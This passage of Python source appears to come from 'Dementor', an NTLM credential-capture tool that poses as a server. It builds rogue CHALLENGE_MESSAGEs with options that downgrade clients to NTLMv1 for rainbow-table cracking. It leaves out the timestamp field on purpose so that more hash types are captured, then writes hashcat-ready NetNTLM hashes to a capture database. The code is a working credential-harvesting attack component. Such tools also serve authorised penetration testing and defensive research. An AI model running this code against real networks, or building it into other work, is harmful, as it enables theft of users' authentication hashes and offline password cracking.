    :param bool disable_ess: Strip NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY from the response.
        Produces NTLMv1 instead of NTLMv1-ESS. NTLMv1 with a fixed
        ServerChallenge is vulnerable to rainbow table attacks
    :param bool disable_ntlmv2: Clear NTLMSSP_NEGOTIATE_TARGET_INFO and omit TargetInfoFields.
        Without TargetInfoFields the client cannot construct the NTLMv2
        Blob per [MS-NLMP section 3.3.2]. Level 0-2 clients fall back to
        NTLMv1. Level 3+ clients will FAIL authentication
    :return: Serialisable CHALLENGE_MESSAGE ready to send to the client
    :rtype: ntlm.NTLMAuthChallenge
    :raises ValueError: If challenge is not exactly 8 bytes

    .. note::

        Flag echoing per [MS-NLMP section 3.2.5.1.1]:

        SIGN, SEAL, ALWAYS_SIGN, KEY_EXCH, 56, 128 are echoed when the
        client requests them. This is mandatory -- failing to echo SIGN
        causes some clients to drop the connection before sending the
        AUTHENTICATE_MESSAGE, losing the capture. Dementor never computes
        session keys; it only echoes these flags to keep the handshake alive
        through hash capture.

        ESS / LM_KEY mutual exclusivity per [MS-NLMP section 2.2.2.5 flag P]:

        If both are requested, only ESS is returned.
    """
    if len(challenge) != NTLM_CHALLENGE_LEN:
        raise ValueError(
            f"challenge must be {NTLM_CHALLENGE_LEN} bytes, got {len(challenge)}"
        )

    # Client's NegotiateFlags from NEGOTIATE_MESSAGE
    client_flags: int = token["flags"]
    dm_logger.debug(
        "Building CHALLENGE_MESSAGE: name=%r domain=%r disable_ess=%s disable_ntlmv2=%s",
        name,
        domain,
        disable_ess,
        disable_ntlmv2,
    )

    # -- Build the response flags for CHALLENGE_MESSAGE ----------------------
    response_flags: int = (
        ntlm.NTLMSSP_REQUEST_TARGET  # TargetName is supplied
        | ntlm.NTLMSSP_TARGET_TYPE_SERVER  # Target is a server, not domain
    )

    # -- TargetInfoFields (controls NTLMv2 availability) -------------------
    # When set, TargetInfoFields is populated with AV_PAIRS.  Without it,
    # NTLMv2 clients cannot build the Blob and authentication fails.
    if not disable_ntlmv2:
        response_flags |= ntlm.NTLMSSP_NEGOTIATE_TARGET_INFO

    # -- NTLM protocol flag (mandatory echo) -------------------------------
    if client_flags & ntlm.NTLMSSP_NEGOTIATE_NTLM:
        response_flags |= ntlm.NTLMSSP_NEGOTIATE_NTLM

    # -- Echo client-requested capability flags ----------------------------
    # Dementor does not implement signing/sealing but MUST echo these so
    # the client proceeds to send the AUTHENTICATE_MESSAGE.  The protocol
    # handler (SMB, HTTP, LDAP) ends the session gracefully after capture.
    for flag in (
        ntlm.NTLMSSP_NEGOTIATE_UNICODE,
        ntlm.NTLM_NEGOTIATE_OEM,
        ntlm.NTLMSSP_NEGOTIATE_56,
        ntlm.NTLMSSP_NEGOTIATE_128,
        ntlm.NTLMSSP_NEGOTIATE_KEY_EXCH,
        ntlm.NTLMSSP_NEGOTIATE_SIGN,  # MUST echo per [MS-NLMP section 2.2.1.2]
        ntlm.NTLMSSP_NEGOTIATE_SEAL,
        ntlm.NTLMSSP_NEGOTIATE_ALWAYS_SIGN,
    ):
        if client_flags & flag:
            response_flags |= flag

    # -- Extended Session Security (ESS) -----------------------------------
    # 0x00080000 -- upgrades NTLMv1 to use MD5-enhanced challenge derivation.
    # impacket defines this as both NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
    # and NTLMSSP_NEGOTIATE_NTLM2 (same value), so one check suffices.
    if not disable_ess:
        if client_flags & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
            response_flags |= ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
            dm_logger.debug("ESS flag echoed into CHALLENGE_MESSAGE")
        elif client_flags & ntlm.NTLMSSP_NEGOTIATE_LM_KEY:
            response_flags |= ntlm.NTLMSSP_NEGOTIATE_LM_KEY
            dm_logger.debug("LM_KEY flag echoed into CHALLENGE_MESSAGE")

    # -- VERSION negotiation -------------------------------------------------
    # Per §2.2.1.2 and §3.2.5.1.1, Version should be populated only when
    # NTLMSSP_NEGOTIATE_VERSION is negotiated; otherwise it must be all-zero.
    if client_flags & ntlm.NTLMSSP_NEGOTIATE_VERSION:
        response_flags |= ntlm.NTLMSSP_NEGOTIATE_VERSION

    # -- ESS / LM_KEY mutual exclusivity -----------------------------------
    if response_flags & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
        response_flags &= ~ntlm.NTLMSSP_NEGOTIATE_LM_KEY

    # -- Assemble the CHALLENGE_MESSAGE ------------------------------------
    # TargetName (§2.2.1.2): the server's authentication realm.  A domain-
    # joined server returns the NetBIOS domain name (flat, first DNS label,
    # uppercase); a workgroup server returns the NetBIOS computer name.
    # We always use the domain: NTLM_split_fqdn guarantees `domain` is
    # either the DNS suffix (e.g. "corp.example.com") or "WORKGROUP".
    target_name_str: str = (
        domain.split(".", 1)[0].upper() if "." in domain else domain.upper()
    )
    target_name_bytes: bytes = NTLM_AUTH_encode_string(target_name_str, response_flags)

    challenge_message = ntlm.NTLMAuthChallenge()
    challenge_message["flags"] = response_flags
    challenge_message["challenge"] = challenge
    challenge_message["domain_len"] = len(target_name_bytes)
    challenge_message["domain_max_len"] = len(target_name_bytes)
    challenge_message["domain_offset"] = NTLM_CHALLENGE_MSG_DOMAIN_OFFSET
    challenge_message["domain_name"] = target_name_bytes
    challenge_message["Version"] = NTLM_VERSION_PLACEHOLDER
    challenge_message["VersionLen"] = NTLM_VERSION_LEN

    # TargetInfoFields (§2.2.1.2) sits immediately after TargetName in the
    # wire payload; its buffer offset is computed from TargetName's length.
    target_info_offset: int = NTLM_CHALLENGE_MSG_DOMAIN_OFFSET + len(target_name_bytes)

    if disable_ntlmv2:
        # Omitting TargetInfoFields prevents the client from constructing
        # an NTLMv2 Blob (§3.3.2), forcing NTLMv1-capable clients to fall
        # back to NTLMv1.  Level 3+ clients will refuse to authenticate.
        challenge_message["TargetInfoFields_len"] = 0
        challenge_message["TargetInfoFields_max_len"] = 0
        challenge_message["TargetInfoFields"] = b""
        challenge_message["TargetInfoFields_offset"] = target_info_offset
        dm_logger.debug("TargetInfoFields omitted (disable_ntlmv2=True)")
    else:
        # TargetInfo is a sequence of AV_PAIR structures (§2.2.2.1).
        # Full AvId space — disposition for each entry:
        #
        #   AvId   Constant             Sent  Notes
        #   0x0000 MsvAvEOL             auto  List terminator; ntlm.AV_PAIRS appends it.
        #   0x0001 MsvAvNbComputerName  YES   MUST per spec. NetBIOS flat name, uppercase.
        #   0x0002 MsvAvNbDomainName    YES   MUST per spec. NetBIOS flat domain, uppercase.
        #   0x0003 MsvAvDnsComputerName YES   Computer FQDN.
        #   0x0004 MsvAvDnsDomainName   YES   DNS domain FQDN.
        #   0x0005 MsvAvDnsTreeName     COND  Forest FQDN; omitted when not domain-joined.
        #   0x0006 MsvAvFlags           NO    Constrained-auth flag (0x1); not applicable
        #                                     here — Dementor does not enforce constrained
        #                                     delegation.  0x2/0x4 bits are client→server.
        #   0x0007 MsvAvTimestamp       NO    Intentionally omitted; see note below.
        #   0x0008 MsvAvSingleHost      N/A   Client→server only (AUTHENTICATE_MESSAGE).
        #   0x0009 MsvAvTargetName      N/A   Client→server only (AUTHENTICATE_MESSAGE).
        #   0x000A MsvAvChannelBindings N/A   Client→server only (AUTHENTICATE_MESSAGE).
        #
        # §2.2.2.1: 0x0001 and 0x0002 MUST be present.  MsvAvEOL is
        # appended automatically by ntlm.AV_PAIRS.  AV_PAIRs may appear in
        # any order per spec; ascending AvId matches real Windows behaviour.

        # 1. Input defaults -------------------------------------------------
        # NTLM_split_fqdn guarantees non-empty strings, but guard explicitly
        # so the rest of this block never operates on empty inputs.
        av_name = name or "WORKSTATION"
        av_domain = domain or "WORKGROUP"
        is_domain_joined = av_domain not in ("", "WORKGROUP")

        # 2. String processing ----------------------------------------------
        # Derive the exact Unicode string that each AV_PAIR constant expects.
        # NetBIOS names are flat (no dots) and uppercase per NetBIOS convention.
        # DNS names preserve their original case from the FQDN configuration.
        nb_computer_str = av_name.upper()  # 0x0001: "SERVER1"
        nb_domain_str = (
            av_domain.split(".", 1)[0].upper() if "." in av_domain else av_domain.upper()
        )  # 0x0002: "CORP"
        dns_computer_str = (
            f"{av_name}.{av_domain}" if is_domain_joined else av_name
        )  # 0x0003: "server1.corp.example.com"
        dns_domain_str = av_domain  # 0x0004: "corp.example.com"
        dns_tree_str = (
            av_domain if is_domain_joined else None
        )  # 0x0005: "corp.example.com", or None to omit

        # 3. Encoding -------------------------------------------------------
        # NTLM_AUTH_encode_string selects UTF-16LE or OEM based on the
        # negotiated UNICODE flag in response_flags.  Per §2.2.2.1 (note),
        # TargetInfo AV_PAIR values MUST be Unicode regardless of the
        # negotiated encoding; all modern clients negotiate UNICODE, so this
        # is consistent in practice.
        nb_computer_bytes = NTLM_AUTH_encode_string(nb_computer_str, response_flags)
        nb_domain_bytes = NTLM_AUTH_encode_string(nb_domain_str, response_flags)
        dns_computer_bytes = NTLM_AUTH_encode_string(dns_computer_str, response_flags)
        dns_domain_bytes = NTLM_AUTH_encode_string(dns_domain_str, response_flags)
        dns_tree_bytes = (
            NTLM_AUTH_encode_string(dns_tree_str, response_flags)
            if dns_tree_str
            else None
        )

        # 4. AV_PAIRS -------------------------------------------------------
        av_pairs = ntlm.AV_PAIRS()
        av_pairs[ntlm.NTLMSSP_AV_HOSTNAME] = (
            nb_computer_bytes  # MsvAvNbComputerName  (0x0001)
        )
        av_pairs[ntlm.NTLMSSP_AV_DOMAINNAME] = (
            nb_domain_bytes  # MsvAvNbDomainName    (0x0002)
        )
        av_pairs[ntlm.NTLMSSP_AV_DNS_HOSTNAME] = (
            dns_computer_bytes  # MsvAvDnsComputerName (0x0003)
        )
        av_pairs[ntlm.NTLMSSP_AV_DNS_DOMAINNAME] = (
            dns_domain_bytes  # MsvAvDnsDomainName   (0x0004)
        )
        if dns_tree_bytes:
            av_pairs[ntlm.NTLMSSP_AV_DNS_TREENAME] = (
                dns_tree_bytes  # MsvAvDnsTreeName     (0x0005)
            )

        # MsvAvTimestamp (0x0007) is intentionally NOT included.
        # Per §3.3.2 rule 7: when the server sends MsvAvTimestamp, the
        # client MUST NOT send an LmChallengeResponse (sets it to Z(24)).
        # Omitting it ensures clients still send a real LMv2 alongside the
        # NetNTLMv2 response, maximising the number of captured hash types.
        challenge_message["TargetInfoFields_len"] = len(av_pairs)
        challenge_message["TargetInfoFields_max_len"] = len(av_pairs)
        challenge_message["TargetInfoFields"] = av_pairs
        challenge_message["TargetInfoFields_offset"] = target_info_offset
        dm_logger.debug("TargetInfoFields populated with AV_PAIRS")

    dm_logger.debug(
        "CHALLENGE_MESSAGE built: flags=0x%08x challenge=%s",
        response_flags,
        challenge.hex(),
    )
    return challenge_message


# ===========================================================================
# Capture Reporting -- Session Database Integration
# ===========================================================================


def NTLM_report_auth(
    auth_token: ntlm.NTLMAuthChallengeResponse,
    challenge: bytes,
    client: tuple[str, int],
    session: SessionConfig,
    logger: ProtocolLogger | None = None,
    extras: dict[str, Any] | None = None,
    transport: str = NTLM_TRANSPORT_NTLMSSP,
) -> None:
    """Extract all crackable hashes from an AUTHENTICATE_MESSAGE and log them.

    Top-level entry point called by protocol handlers (SMB, HTTP, LDAP).
    Extracts every valid hashcat line (NetNTLMv2 + LMv2, or NetNTLMv1/NetNTLMv1-ESS)
    and writes each as a separate entry to the session capture database.

    :param ntlm.NTLMAuthChallengeResponse auth_token: Parsed AUTHENTICATE_MESSAGE
    :param bytes challenge: 8-byte ServerChallenge from the CHALLENGE_MESSAGE Dementor sent
    :param tuple[str, int] client: Client connection context (passed through to db.add_auth)
    :param SessionConfig session: Session context with a .db attribute for capture storage
    :param ProtocolLogger|None logger: Logger for capture output
    :param dict|None extras: Additional metadata for db.add_auth
    :param str transport: NTLM transport identifier (NTLM_TRANSPORT_*); used for logging only
    """
    # Use the protocol logger for session-linked messages; fall back to the
    # module logger when no protocol logger is provided.
    log = logger or dm_logger

    log.debug(
        "NTLM_report_auth: transport=%s  NT_len=%d  LM_len=%d",
        transport,
        len(auth_token["ntlm"] or b""),
        len(auth_token["lanman"] or b""),
    )
    if NTLM_AUTH_is_anonymous(auth_token):
        method = log.display if logger else log.debug
        method("Anonymous NTLM login attempt; skipping hash extraction")
        return

    try:
        negotiate_flags: int = auth_token["flags"]

        all_hashes = NTLM_AUTH_to_hashcat_formats(
            server_challenge=challenge,
            user_name=auth_token["user_name"],
            domain_name=auth_token["domain_name"],
            lm_response=auth_token["lanman"],
            nt_response=auth_token["ntlm"],
            negotiate_flags=negotiate_flags,
        )

        if not all_hashes:
            log.warning(
                "AUTHENTICATE_MESSAGE produced no crackable hashes "
                "(user=%r flags=0x%08x)",
                auth_token["user_name"],
                negotiate_flags,
            )
            return

        user_name: str = NTLM_AUTH_decode_string(
            auth_token["user_name"],
            negotiate_flags,
        )
        domain_name: str = NTLM_AUTH_decode_string(
            auth_token["domain_name"],
            negotiate_flags,
        )

        log.debug(
            "Writing %d hash(es) to capture database for user=%r domain=%r",
            len(all_hashes),
            user_name,
            domain_name,
        )
        host_info = NTLM_AUTH_format_host(auth_token)
        extras = extras or {}
        extras[_HOST_INFO] = host_info
        # REVISIT: this should be added once SMB1 legacy commands are implemented
        # "Transport": transport,
        for version_label, hashcat_line in all_hashes:
            session.db.add_auth(
                client=client,
                credtype=version_label,
                username=user_name,
                domain=domain_name,
                password=hashcat_line,
                logger=logger,
                extras=extras,
            )

    except ValueError:
        log.exception(
            "Invalid data in AUTHENTICATE_MESSAGE (bad challenge length or "
            "malformed response fields); skipping capture"
        )
    except Exception:
        log.exception("Failed to extract NTLM hashes from AUTHENTICATE_MESSAGE")
